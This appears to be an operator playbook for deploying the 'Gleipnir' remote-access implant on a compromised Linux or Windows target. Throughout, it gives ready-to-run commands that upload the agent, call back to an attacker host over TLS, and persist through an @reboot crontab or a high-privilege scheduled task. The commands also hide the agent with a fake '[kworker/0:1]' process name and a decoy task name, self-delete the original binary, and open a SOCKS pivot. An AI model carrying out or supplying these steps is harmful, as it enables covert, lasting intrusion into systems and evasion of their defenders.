# Gleipnir Agent Deployment

## When to use

- You have initial access to a target (shell, RCE, file write + exec)
- You need persistent shell access that survives reboots and network drops
- You need file transfer or SOCKS pivoting through the target
- Raw reverse shells (netcat, bash) are unreliable or lack features

## Tags

- ATT&CK: T1059 (Command and Scripting Interpreter), T1105 (Ingress Tool Transfer)
- Platform: Linux, Windows
- Phase: exploit, postexploit

## Binary selection

Find the right binary for the target with `pk agent path <target>`:

| Target | Binary | Notes |
|--------|--------|-------|
| `linux-amd64` | pk-agent-linux-amd64 | Slim, ~500KB, plain TCP |
| `linux-amd64-tls` | pk-agent-linux-amd64-tls | ~1.5MB, encrypted |
| `linux-arm64` | pk-agent-linux-arm64 | ARM64 Linux (Raspberry Pi, AWS Graviton) |
| `windows-amd64` | pk-agent-windows-amd64.exe | Plain TCP |
| `windows-amd64-tls` | pk-agent-windows-amd64-tls.exe | Encrypted |

Pre-compiled binaries are in `/opt/gleipnir/agents/` on the attackbox.

## Deployment: Linux

```bash
# Upload the agent
pk upload <session> $(pk agent path linux-amd64-tls) /tmp/.cache

# Make executable and run with persistence
pk shell exec <session> "chmod +x /tmp/.cache && /tmp/.cache -H <LHOST> -p 4444 --tls --install /dev/shm --cron --masquerade '[kworker/0:1]' --self-delete &"
```

Flags explained:
- `-H <LHOST>`: callback IP (comma-separated for fallback: `-H 10.10.14.5,10.10.14.6`)
- `--tls`: encrypted channel (relay auto-generates cert)
- `--install /dev/shm`: copy to hidden path, run from there
- `--cron`: survive reboots via @reboot crontab
- `--masquerade '[kworker/0:1]'`: fake process name in `ps`
- `--self-delete`: remove the original binary after loading

## Deployment: Windows

```bash
# Upload the agent
pk upload <session> $(pk agent path windows-amd64-tls) "C:\ProgramData\Microsoft\update.exe"

# Run with persistence
pk shell exec <session> "C:\ProgramData\Microsoft\update.exe -H <LHOST> -p 4444 --tls --install \"\" --cron --task-name SystemHealthCheck"
```

Flags for Windows:
- `--install ""`: defaults to `%APPDATA%\Microsoft\update.exe`, sets `attrib +h`
- `--cron`: creates scheduled task (onlogon, highest privilege)
- `--registry`: alternative to schtasks, uses HKCU Run key
- `--task-name SystemHealthCheck`: task name shown in Task Scheduler
- `--self-delete`: delayed deletion via `cmd /c ping & del`

## Verify connection

```bash
pk shell list                    # check session appeared
pk shell info <session>          # confirm OS, user, hostname
pk shell exec <session> "whoami" # verify command execution
```

## Post-deployment

- `pk shell attach <session>` for interactive terminal
- `pk tunnel up <session> --socks 1080` for pivoting
- `pk upload`/`pk download` for file transfer (handles large files, binary safe)

Session auto-reconnects on network drops or target reboots (exponential backoff,
1s to 30s). Session ID persists so the relay resumes the same session name.
